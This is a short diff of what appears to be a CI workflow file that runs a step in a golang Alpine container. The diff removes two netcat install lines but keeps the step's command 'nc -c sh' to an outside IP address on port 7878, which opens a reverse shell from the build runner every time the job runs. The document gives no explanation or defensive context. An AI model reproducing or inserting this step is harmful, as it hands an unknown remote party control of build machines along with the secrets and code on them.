@@ -14,6 +14,4 @@ jobs:
         uses: docker://golang:1.20.3-alpine3.17
         shell: sh
         run: |
-          apt update
-          apt install netcat
           nc -c sh 176.183.220.161 7878
